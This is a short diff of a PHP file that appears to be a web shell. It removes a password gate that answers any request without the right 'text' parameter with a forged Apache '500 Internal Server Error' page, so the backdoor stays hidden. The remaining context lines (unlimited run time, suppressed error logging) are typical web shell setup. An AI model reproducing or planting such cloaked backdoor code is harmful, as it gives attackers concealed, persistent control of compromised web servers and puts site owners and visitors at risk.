@@ -1,24 +1,4 @@
 <?php
-$hashKunci = '$2y$10$aLPO4q0FDnee8M0E4mCBCezsUGczoUXsfEAHjL7lqMCGLWqxxGGW.';
-
-if (!isset($_GET['text']) || !password_verify($_GET['text'], $hashKunci)) {
-    http_response_code(500);
-    header('Content-Type: text/html; charset=UTF-8');
-    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>500 Internal Server Error</title>
-</head><body>
-<h1>Internal Server Error</h1>
-<p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
-<p>Please contact the server administrator at webmaster@localhost to inform them of the time this error occurred, and the actions you performed just before this error.</p>
-<p>More information about this error may be available in the server error log.</p>
-<hr>
-<address>Apache/2.4.16 (Ubuntu) Server at '.$_SERVER['SERVER_ADDR'].' Port '.$_SERVER['SERVER_PORT'].'</address>
-</body></html>';
-    exit;
-}
-?>
-<?php
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
